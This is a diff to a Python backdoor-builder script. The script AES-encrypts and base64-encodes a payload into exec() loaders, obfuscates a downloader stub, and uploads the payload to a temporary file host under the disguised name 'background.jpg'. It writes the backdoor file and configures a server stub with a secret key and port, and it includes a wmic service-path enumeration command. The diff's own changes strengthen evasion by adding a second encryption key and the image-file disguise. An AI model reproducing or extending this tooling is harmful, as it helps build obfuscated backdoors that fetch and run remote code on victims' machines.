@@ -74,7 +74,7 @@ if args.expire:
 		exit()
 else:
 	if args.customurl[:4] != 'http':
-		print ' [X] Error: Cutom url must be formatted: http\n'
+		print ' [X] Error: Cutom url must be formatted: eg. http://site.com/file\n'
 		parser.print_help()
 		exit()
 
@@ -110,7 +110,7 @@ BLOCK_SIZE, PADDING = 32, '{'
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-key, iv, secretkey = randKey(32), randKey(16), randKey(32)
+key, key2, iv, secretkey = randKey(32), randKey(16), randKey(32), randKey(32)
 be64var, bd64var, AESvar, envvar = randVar(), randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
@@ -167,12 +167,12 @@ payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,payload)))
 
 if not args.customurl:
-	with open('readme.txt', 'wb') as df:
+	with open('background.jpg', 'wb') as df:
 		df.write(downpayload)
 	print ' [<] Uploading payload code to tempsend..'
-	downurl = ftempsend('readme.txt')
+	downurl = ftempsend('background.jpg')
 	print ' [*] Code uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
-	os.remove('readme.txt')
+	os.remove('background.jpg')
 	dlf = 'stubs/downloader.py'
 else:
 	with open('code.txt', 'wb') as lf:
@@ -189,6 +189,7 @@ with open('tempobfs.py', 'wb') as o:
 obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
+cipher = AES.new(key2)
 downloader = EncodeAES(cipher, downloaderscript)
 
 with open(backdoorName, 'w') as f:
@@ -198,7 +199,7 @@ with open(backdoorName, 'w') as f:
 	f.write('try:\n	import ')
 	f.write(",".join(mywindows) + "\n")
 	f.write('except:\n	pass\n')
-	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,downloader))))
+	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key2,bd64var,downloader))))
 
 with open('stubs/server.py', 'rb') as rawserv:
 	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
